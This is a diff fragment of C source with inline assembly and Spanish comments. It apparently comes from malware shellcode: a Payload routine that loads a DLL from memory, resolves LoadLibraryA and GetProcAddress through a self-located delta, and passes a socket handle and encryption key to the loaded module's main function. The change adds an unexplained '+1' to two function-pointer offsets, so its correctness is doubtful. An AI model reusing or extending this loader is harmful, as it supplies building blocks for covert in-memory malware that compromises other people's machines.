@@ -36,6 +36,7 @@ struct SHELLCODE_CONTEXT{
 
 typedef HINSTANCE (__stdcall *LoadLibraryFromMemory_)(void* AddrBase,const char* ModName);
 typedef void* (__stdcall *FreeLibraryFromMemory_)(void* AddrBase);
+
 typedef struct LoaderFunTable{
     //Puntero a las funciones para la carga y descarga de módulos desde memoria
     LoadLibraryFromMemory_ LLFM;
@@ -952,8 +953,8 @@ void Payload(SHELLCODE_CONTEXT *scc){
                         LoaderFunTable LFT;
                         LFT.FLFM                    = (FreeLibraryFromMemory_)((PBYTE)FreeLibraryFromMemory + scc->Delta);
                         LFT.LLFM                    = (LoadLibraryFromMemory_)((PBYTE)LoadLibraryFromMemory + scc->Delta);
-                        LFT.GetProcAddress          = (unsigned long**)((PBYTE)GetProcAddress_ + scc->Delta);
-                        LFT.LoadLibraryA            = (unsigned long**)((PBYTE)LoadLibraryA_ + scc->Delta);
+                        LFT.GetProcAddress          = (unsigned long**)((PBYTE)GetProcAddress_ + scc->Delta + 1);
+                        LFT.LoadLibraryA            = (unsigned long**)((PBYTE)LoadLibraryA_ + scc->Delta + 1);
                         //y ejecutamos el Main
                         MainFunc(scc->hSocket, scc->hKey, LFT);
                         //Si el PM nos retorna la ejecución descargamos la DLL de memoria
@@ -971,6 +972,7 @@ void Payload(SHELLCODE_CONTEXT *scc){
 void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
     SHELLCODE_CONTEXT scc;
     DWORD tDelta;
+
     __asm{
 find_delta: 
         fldln2
